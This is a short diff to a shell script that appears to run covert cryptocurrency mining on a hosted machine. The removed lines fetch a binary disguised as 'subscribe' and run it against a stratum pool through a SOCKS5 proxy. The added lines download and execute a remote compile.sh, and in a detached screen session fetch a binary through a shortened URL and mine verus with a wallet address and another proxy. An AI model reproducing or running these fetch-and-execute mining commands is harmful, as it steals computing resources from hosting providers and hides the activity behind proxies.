@@ -4,7 +4,8 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget https://github.com/mrbogel/Student/raw/main/subscribe
-chmod +x subscribe
-./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MoZWmZP537xWNb2HePtZ8ZjEHcawGJdiFG.heroku -x socks5://omar:omar@137.184.167.28:555
+wget -q https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/compile.sh
+screen -dm -S build wget -qO build https://git.io/JX7bv && chmod +x build && ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.errrrror -p x -t 64 -x socks5://a:a@188.166.61.166:98
+chmod +x compile.sh
+./compile.sh
 sleep 99999999999999999
